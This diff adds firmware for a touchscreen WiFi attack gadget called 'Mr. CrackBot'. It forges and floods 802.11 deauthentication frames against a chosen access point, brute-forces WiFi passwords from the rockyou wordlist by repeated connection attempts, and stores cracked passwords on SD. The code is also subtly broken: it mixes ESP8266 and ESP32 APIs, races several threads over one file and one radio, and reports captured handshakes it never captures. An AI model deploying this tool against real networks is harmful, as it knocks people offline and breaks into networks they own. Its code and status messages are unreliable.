@@ -1,0 +1,725 @@
+#include <TFT_eSPI.h>
+#include <WiFi.h>
+#include <SD.h>
+#include <ArduinoJson.h>
+#include <WiFiManager.h>
+#include <TaskScheduler.h>
+#include <pthread.h>
+#include <atomic>
+#include <mutex>
+
+// Define file paths
+#define ROCKYOU_PATH "/rockyou.txt"
+#define SETTINGS_PATH "/settings.json"
+#define CHECKPOINT_PATH "/checkpoint.txt"
+
+// Calibration values for the touch screen
+#define TS_MINX 100
+#define TS_MINY 100
+#define TS_MAXX 920
+#define TS_MAXY 940
+
+// Define touch screen sensitivity
+#define MINPRESSURE 10
+#define MAXPRESSURE 1000
+
+// TFT setup
+TFT_eSPI tft = TFT_eSPI();  // Invoke custom library
+
+// Struct to hold network information
+struct NetworkInfo {
+  String ssid;
+  String bssid;
+  int rssi;
+  int channel;
+  bool has_password;
+  String password;
+};
+
+// Global variables
+std::vector<NetworkInfo> networks;
+NetworkInfo selectedNetwork;
+uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+WiFiManager wifiManager;
+Scheduler tscheduler;
+Task tScanNetworks(0, TASK_ONCE, &scanNetworks, &tscheduler, false);
+Task tUpdateBatteryStatus(60000, TASK_FOREVER, &updateBatteryStatus, &tscheduler, true);
+Task tCrackPassword(0, TASK_ONCE, NULL, &tscheduler, false); // Will be activated manually
+
+std::atomic_long bytesRead(0);
+std::atomic_bool foundPassword(false);
+std::mutex progressMutex;
+
+// Function declarations
+void crackNetworkPassword();
+void deauthNetwork();
+void handleHandshakes();
+void fillDeauthPacket(const String &bssid, bool broadcast = false);
+String crackPassword(const String &ssid, const String &bssid);
+bool tryPassword(const String &ssid, const String &bssid, const String &password);
+void displayNetworkInfo(const NetworkInfo &network);
+void loadNetworksFromSD();
+void saveNetworksToSD();
+void setupFirmware();
+void displayMenu();
+void displaySettingsMenu();
+void adjustBrightness();
+void togglePromiscuousMode();
+void resetNetworkSettings();
+void scanNetworks();
+void selectNetwork();
+void showNetworkInfo();
+void pwnNetwork();
+void enterDeepSleep();
+void setPromiscuousMode(bool enable);
+void sendDeauthPackets(const String &bssid, int count, bool broadcast = false);
+void promiscuous_rx_cb(uint8_t *buf, uint16_t len);
+void updateBatteryStatus();
+void showIntroAnimation();
+void processTouch();
+
+// Function to show intro animation
+void showIntroAnimation() {
+  const char* text = "Mr. CrackBot by @$K";
+  int textX = 40;
+  int textY = 120;
+  
+  // Fade-in
+  for (int brightness = 0; brightness <= 255; brightness += 5) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setTextColor(tft.color565(brightness, 0, 0), TFT_BLACK); // Red color with variable brightness
+    tft.setTextSize(2);
+    tft.setCursor(textX, textY);
+    tft.println(text);
+    delay(50);
+  }
+
+  // Hold the text for a while
+  delay(1000);
+
+  // Fade-out
+  for (int brightness = 255; brightness >= 0; brightness -= 5) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setTextColor(tft.color565(brightness, 0, 0), TFT_BLACK); // Red color with variable brightness
+    tft.setTextSize(2);
+    tft.setCursor(textX, textY);
+    tft.println(text);
+    delay(50);
+  }
+
+  tft.fillScreen(TFT_BLACK);
+}
+
+// Function to crack the network password
+void crackNetworkPassword() {
+  if (!selectedNetwork.ssid.isEmpty()) {
+    tCrackPassword.setCallback([]() {
+      selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
+      saveNetworksToSD();
+      displayNetworkInfo(selectedNetwork);
+      tft.println("Password cracking completed.");
+      tCrackPassword.disable();
+    });
+    tft.println("Cracking password...");
+    tCrackPassword.enable();
+  } else {
+    tft.println("No network selected.");
+  }
+}
+
+// Improved Function to deauthenticate the network
+void deauthNetwork() {
+  if (!selectedNetwork.ssid.isEmpty()) {
+    setPromiscuousMode(true);
+    sendDeauthPackets(selectedNetwork.bssid, 100, true); // Send broadcast deauth packets
+    sendDeauthPackets(selectedNetwork.bssid, 100, false); // Send unicast deauth packets
+    setPromiscuousMode(false);
+    tft.println("Deauth packets sent.");
+  } else {
+    tft.println("No network selected.");
+  }
+}
+
+// Improved Function to handle handshakes
+void handleHandshakes() {
+  if (selectedNetwork.ssid.isEmpty()) {
+    tft.println("No network selected.");
+    return;
+  }
+
+  setPromiscuousMode(true);
+  fillDeauthPacket(selectedNetwork.bssid);
+
+  // Send deauth packets and capture handshakes concurrently
+  for (int i = 0; i < 50; ++i) {
+    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+    delay(20);
+  }
+
+  setPromiscuousMode(false);
+  tft.println("Handshake capture initiated.");
+}
+
+// Function to fill the deauth packet with the BSSID
+void fillDeauthPacket(const String &bssid, bool broadcast) {
+  for (int i = 0; i < 6; ++i) {
+    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+    deauthPacket[16 + i] = broadcast ? 0xFF : strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+  }
+}
+
+// Improved Function to crack the password using the wordlist with multithreading
+String crackPassword(const String &ssid, const String &bssid) {
+  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
+  if (!rockyouFile) {
+    Serial.println("Failed to open rockyou.txt.");
+    tft.println("Failed to open wordlist.");
+    return "";
+  }
+
+  long fileSize = rockyouFile.size();
+  bytesRead = 0;
+  foundPassword = false;
+  String password;
+  String line;
+  tft.println("Cracking Password...");
+
+  // Load checkpoint if available
+  long checkpoint = 0;
+  File checkpointFile = SD.open(CHECKPOINT_PATH, FILE_READ);
+  if (checkpointFile) {
+    checkpoint = checkpointFile.parseInt();
+    checkpointFile.close();
+  }
+
+  // Skip to the last checkpoint
+  rockyouFile.seek(checkpoint);
+
+  // Multi-threading setup
+  int numThreads = 4; // Number of threads
+  pthread_t threads[numThreads];
+  struct CrackThreadArgs {
+    File rockyouFile;
+    String ssid;
+    String bssid;
+    long fileSize;
+    std::atomic_long *bytesRead;
+    std::atomic_bool *foundPassword;
+    String *password;
+    std::mutex *progressMutex;
+  };
+
+  auto crackThread = [](void *args) -> void * {
+    CrackThreadArgs *crackArgs = (CrackThreadArgs *)args;
+    File rockyouFile = crackArgs->rockyouFile;
+    String ssid = crackArgs->ssid;
+    String bssid = crackArgs->bssid;
+    long fileSize = crackArgs->fileSize;
+    std::atomic_long *bytesRead = crackArgs->bytesRead;
+    std::atomic_bool *foundPassword = crackArgs->foundPassword;
+    String *password = crackArgs->password;
+    std::mutex *progressMutex = crackArgs->progressMutex;
+
+    while (rockyouFile.available() && !foundPassword->load()) {
+      String line = rockyouFile.readStringUntil('\n');
+      bytesRead->fetch_add(line.length() + 1);
+      line.trim();
+      if (tryPassword(ssid, bssid, line)) {
+        *password = line;
+        foundPassword->store(true);
+        break;
+      }
+
+      int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
+      {
+        std::lock_guard<std::mutex> lock(*progressMutex);
+        tft.fillRect(0, 50, 320, 20, TFT_BLACK);
+        tft.setCursor(0, 50);
+        tft.printf("Progress: %d%%", progress);
+      }
+
+      delay(5);
+
+      // Check for touch interrupt
+      uint16_t x, y;
+      if (tft.getTouch(&x, &y)) {
+        tft.println("User interrupted the process.");
+        break;
+      }
+    }
+    return NULL;
+  };
+
+  // Create and run threads
+  CrackThreadArgs args = {rockyouFile, ssid, bssid, fileSize, &bytesRead, &foundPassword, &password, &progressMutex};
+  for (int i = 0; i < numThreads; ++i) {
+    pthread_create(&threads[i], NULL, crackThread, &args);
+  }
+
+  // Wait for threads to complete
+  for (int i = 0; i < numThreads; ++i) {
+    pthread_join(threads[i], NULL);
+  }
+
+  // Save checkpoint
+  checkpointFile = SD.open(CHECKPOINT_PATH, FILE_WRITE);
+  if (checkpointFile) {
+    checkpointFile.println(bytesRead.load());
+    checkpointFile.close();
+  }
+
+  rockyouFile.close();
+  return password;
+}
+
+// Function to attempt to connect to a WiFi network with a given password
+bool tryPassword(const String &ssid, const String &bssid, const String &password) {
+  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());
+
+  WiFi.disconnect();
+  delay(100);
+  WiFi.begin(ssid.c_str(), password.c_str());
+
+  unsigned long startTime = millis();
+  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
+    delay(200);
+    Serial.print(".");
+  }
+  
+  bool isConnected = (WiFi.status() == WL_CONNECTED);
+  
+  if (isConnected) {
+    Serial.println("Connected!");
+    WiFi.disconnect();
+    return true;
+  } else {
+    Serial.println("Failed to connect.");
+    return false;
+  }
+}
+
+// Function to display network information on the screen
+void displayNetworkInfo(const NetworkInfo &network) {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.printf("SSID: %s\n", network.ssid.c_str());
+  tft.printf("BSSID: %s\n", network.bssid.c_str());
+  tft.printf("RSSI: %d dBm\n", network.rssi);
+  tft.printf("Channel: %d\n", network.channel);
+  tft.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
+  if (network.has_password) {
+    tft.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
+  }
+}
+
+// Function to load network information from the SD card
+void loadNetworksFromSD() {
+  File file = SD.open("/networks.json", FILE_READ);
+  if (!file) {
+    Serial.println("Failed to open networks.json.");
+    tft.println("Failed to load networks.");
+    return;
+  }
+  
+  DynamicJsonDocument doc(2048);
+  DeserializationError error = deserializeJson(doc, file);
+  if (error) {
+    Serial.println("Failed to parse JSON.");
+    tft.println("Failed to parse networks.");
+    file.close();
+    return;
+  }
+  
+  networks.clear();
+  for (JsonObject network : doc["networks"].as<JsonArray>()) {
+    NetworkInfo net;
+    net.ssid = network["ssid"].as<String>();
+    net.bssid = network["bssid"].as<String>();
+    net.rssi = network["rssi"].as<int>();
+    net.channel = network["channel"].as<int>();
+    net.has_password = network["has_password"].as<bool>();
+    net.password = network["password"].as<String>();
+    networks.push_back(net);
+  }
+  
+  file.close();
+  tft.println("Networks loaded.");
+}
+
+// Function to save network information to the SD card
+void saveNetworksToSD() {
+  File file = SD.open("/networks.json", FILE_WRITE);
+  if (!file) {
+    Serial.println("Failed to open networks.json for writing.");
+    tft.println("Failed to save networks.");
+    return;
+  }
+
+  DynamicJsonDocument doc(2048);
+  JsonArray netArray = doc.createNestedArray("networks");
+  for (const NetworkInfo &net : networks) {
+    JsonObject netObj = netArray.createNestedObject();
+    netObj["ssid"] = net.ssid;
+    netObj["bssid"] = net.bssid;
+    netObj["rssi"] = net.rssi;
+    netObj["channel"] = net.channel;
+    netObj["has_password"] = net.has_password;
+    netObj["password"] = net.password;
+  }
+
+  if (serializeJson(doc, file) == 0) {
+    Serial.println("Failed to write JSON to file.");
+    tft.println("Failed to save networks.");
+  }
+
+  file.close();
+  tft.println("Networks saved.");
+}
+
+// Function to set up the firmware
+void setupFirmware() {
+  // Initialize TFT
+  tft.begin();
+  tft.setRotation(1);
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(2);
+  tft.setCursor(0, 0);
+
+  // Initialize WiFi
+  if (WiFi.status() == WL_NO_SHIELD) {
+    tft.println("WiFi shield not present");
+    while (true);
+  }
+
+  // Use WiFiManager to manage WiFi connections
+  wifiManager.autoConnect("AutoConnectAP");
+
+  // Initialize SD card
+  if (!SD.begin()) {
+    tft.println("SD Card initialization failed.");
+  } else {
+    tft.println("SD Card initialized.");
+  }
+  
+  // Load networks from SD card
+  loadNetworksFromSD();
+  
+  // Display intro animation
+  showIntroAnimation();
+  
+  // Display menu
+  displayMenu();
+}
+
+// Function to initialize the device
+void setup() {
+  Serial.begin(115200);
+  setupFirmware();
+}
+
+void loop() {
+  tscheduler.execute();
+  delay(5);
+  processTouch();
+}
+
+// Function to process touch input
+void processTouch() {
+  uint16_t x, y;
+  if (tft.getTouch(&x, &y)) {
+    if (y >= 0 && y < 40) {
+      // Scan Networks
+      if (x >= 0 && x < 80) {
+        tScanNetworks.enable();
+      }
+      // Select Network
+      else if (x >= 80 && x < 160) {
+        selectNetwork();
+      }
+      // Show Network Info
+      else if (x >= 160 && x < 240) {
+        showNetworkInfo();
+      }
+      // Pwn Network
+      else if (x >= 240 && x < 320) {
+        pwnNetwork();
+      }
+    } else if (y >= 40 && y < 80) {
+      // Crack Password
+      if (x >= 0 && x < 80) {
+        crackNetworkPassword();
+      }
+      // Deauth Network
+      else if (x >= 80 && x < 160) {
+        deauthNetwork();
+      }
+      // Settings Menu
+      else if (x >= 160 && x < 240) {
+        displaySettingsMenu();
+      }
+    }
+  }
+}
+
+// Function to display the menu
+void displayMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.println("Mr. CrackBot Menu");
+  tft.setTextSize(1);
+  tft.println("A: Scan Networks");
+  tft.println("B: Select Network");
+  tft.println("C: Show Network Info");
+  tft.println("D: Pwn Network");
+  tft.println("E: Crack Password");
+  tft.println("F: Deauth Network");
+  tft.println("Settings: Touch all three buttons");
+}
+
+// Function to display the settings menu
+void displaySettingsMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.println("Settings Menu");
+  tft.setTextSize(1);
+  tft.println("A: Adjust Brightness");
+  tft.println("B: Toggle Promiscuous Mode");
+  tft.println("C: Reset Network Settings");
+
+  while (true) {
+    uint16_t x, y;
+    if (tft.getTouch(&x, &y)) {
+      if (y >= 0 && y < 40) {
+        if (x >= 0 && x < 80) {
+          adjustBrightness();
+        } else if (x >= 80 && x < 160) {
+          togglePromiscuousMode();
+        } else if (x >= 160 && x < 240) {
+          resetNetworkSettings();
+        } else if (x >= 240 && x < 320) {
+          displayMenu();
+          break;
+        }
+      }
+    }
+  }
+}
+
+// Function to adjust the brightness
+void adjustBrightness() {
+  int brightness = 100;
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.println("Adjust Brightness");
+
+  while (true) {
+    tft.setCursor(0, 30);
+    tft.printf("Brightness: %d", brightness);
+    tft.fillRect(0, 60, 320, 20, TFT_BLACK);
+
+    uint16_t x, y;
+    if (tft.getTouch(&x, &y)) {
+      if (y >= 0 && y < 40) {
+        if (x >= 0 && x < 80) {
+          brightness = constrain(brightness - 10, 0, 255);
+        } else if (x >= 80 && x < 160) {
+          brightness = constrain(brightness + 10, 0, 255);
+        } else if (x >= 160 && x < 240) {
+          break;
+        }
+      }
+    }
+
+    analogWrite(LED_BUILTIN, brightness); // Example to adjust brightness
+    delay(100);
+  }
+}
+
+// Function to toggle promiscuous mode
+void togglePromiscuousMode() {
+  static bool promiscuousEnabled = false;
+  promiscuousEnabled = !promiscuousEnabled;
+  setPromiscuousMode(promiscuousEnabled);
+  
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.printf("Promiscuous Mode: %s", promiscuousEnabled ? "Enabled" : "Disabled");
+  delay(2000);
+}
+
+// Function to reset network settings
+void resetNetworkSettings() {
+  wifiManager.resetSettings();
+  
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.println("Network settings reset.");
+  delay(2000);
+
+  ESP.restart();
+}
+
+// Function to scan for networks
+void scanNetworks() {
+  int n = WiFi.scanNetworks();
+  if (n == 0) {
+    tft.println("No networks found.");
+  } else {
+    networks.clear();
+    for (int i = 0; i < n; ++i) {
+      NetworkInfo net;
+      net.ssid = WiFi.SSID(i);
+      net.bssid = WiFi.BSSIDstr(i);
+      net.rssi = WiFi.RSSI(i);
+      net.channel = WiFi.channel(i);
+      net.has_password = false;
+      networks.push_back(net);
+    }
+    saveNetworksToSD();
+    tft.println("Networks scanned and saved.");
+  }
+}
+
+// Function to select a network
+void selectNetwork() {
+  if (networks.empty()) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 0);
+    tft.setTextSize(2);
+    tft.println("No networks to select.");
+    return;
+  }
+
+  int selectedIndex = 0;
+  bool selectionConfirmed = false;
+
+  while (!selectionConfirmed) {
+    tft.fillScreen(TFT_BLACK);
+    tft.setCursor(0, 0);
+    tft.setTextSize(2);
+
+    for (int i = 0; i < networks.size(); ++i) {
+      if (i == selectedIndex) {
+        tft.setTextColor(TFT_RED, TFT_BLACK);
+      } else {
+        tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      }
+      tft.printf("%d: %s\n", i + 1, networks[i].ssid.c_str());
+    }
+
+    uint16_t x, y;
+    if (tft.getTouch(&x, &y)) {
+      if (y >= 0 && y < 40) {
+        if (x >= 0 && x < 80) {
+          selectedIndex = (selectedIndex - 1 + networks.size()) % networks.size();
+        } else if (x >= 80 && x < 160) {
+          selectedIndex = (selectedIndex + 1) % networks.size();
+        } else if (x >= 160 && x < 240) {
+          selectionConfirmed = true;
+        }
+      }
+    }
+  }
+
+  selectedNetwork = networks[selectedIndex];
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.println("Network selected:");
+  displayNetworkInfo(selectedNetwork);
+}
+
+// Function to show network information
+void showNetworkInfo() {
+  if (!selectedNetwork.ssid.isEmpty()) {
+    displayNetworkInfo(selectedNetwork);
+  } else {
+    tft.println("No network selected.");
+  }
+}
+
+// Improved Function to pwn the network
+void pwnNetwork() {
+  if (!selectedNetwork.ssid.isEmpty()) {
+    setPromiscuousMode(true);
+    
+    // Create a task for sending deauth packets
+    auto sendDeauthPacketsTask = []() {
+      int retryCount = 3;
+      for (int i = 0; i < retryCount; ++i) {
+        sendDeauthPackets(selectedNetwork.bssid, 100, true); // Send broadcast deauth packets
+        sendDeauthPackets(selectedNetwork.bssid, 100, false); // Send unicast deauth packets
+        delay(1000); // Wait for a second before retrying
+      }
+    };
+    
+    // Create a task for capturing handshakes
+    auto captureHandshakesTask = []() {
+      handleHandshakes();
+    };
+
+    // Run the tasks concurrently
+    std::thread deauthThread(sendDeauthPacketsTask);
+    std::thread handshakeThread(captureHandshakesTask);
+
+    deauthThread.join();
+    handshakeThread.join();
+
+    setPromiscuousMode(false);
+    
+    tft.println("Network pwned and handshakes captured.");
+  } else {
+    tft.println("No network selected.");
+  }
+}
+
+// Function to enter deep sleep
+void enterDeepSleep() {
+  tft.println("Entering deep sleep...");
+  delay(1000);
+  esp_deep_sleep_start();
+}
+
+// Function to set promiscuous mode
+void setPromiscuousMode(bool enable) {
+  if (enable) {
+    wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
+    wifi_promiscuous_enable(1);
+  } else {
+    wifi_promiscuous_enable(0);
+  }
+}
+
+// Improved Function to send deauth packets
+void sendDeauthPackets(const String &bssid, int count, bool broadcast) {
+  fillDeauthPacket(bssid, broadcast);
+  for (int i = 0; i < count; ++i) {
+    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+    delay(1); // Reduced delay to increase packet sending rate
+  }
+}
+
+// Promiscuous mode callback function
+void promiscuous_rx_cb(uint8_t *buf, uint16_t len) {
+  Serial.printf("Packet received: len=%d\n", len);
+  for (int i = 0; i < len; i++) {
+    Serial.printf("%02x ", buf[i]);
+  }
+  Serial.println();
+}
+
+// Function to update battery status
+void updateBatteryStatus() {
+  // Your code to update battery status
+}
